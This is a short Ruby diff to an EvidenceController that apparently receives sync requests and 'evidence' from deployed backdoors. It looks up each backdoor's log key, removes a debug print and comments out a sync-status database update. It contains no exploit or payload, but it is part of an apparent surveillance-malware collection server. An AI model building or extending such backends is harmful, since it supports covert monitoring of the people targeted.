@@ -60,9 +60,10 @@ class EvidenceController < RESTController
 
     # create a phony session
     session = params.symbolize
-puts session.inspect
+
     # retrieve the key from the db
-    key = DB.instance.backdoor_evidence_key(session[:bid])
+    backdoor = Item.where({_id: session[:bid]}).first
+    key = backdoor[:logkey]
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(params['sync_time']).getutc
@@ -71,7 +72,7 @@ puts session.inspect
     EvidenceManager.instance.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
 
     # update db with sync status
-    DB.instance.backdoor_sync_start session[:bid], time, params['user'], params['device'], params['source']
+    #DB.instance.backdoor_sync_start session[:bid], time, params['user'], params['device'], params['source']
     
     return STATUS_OK
   end
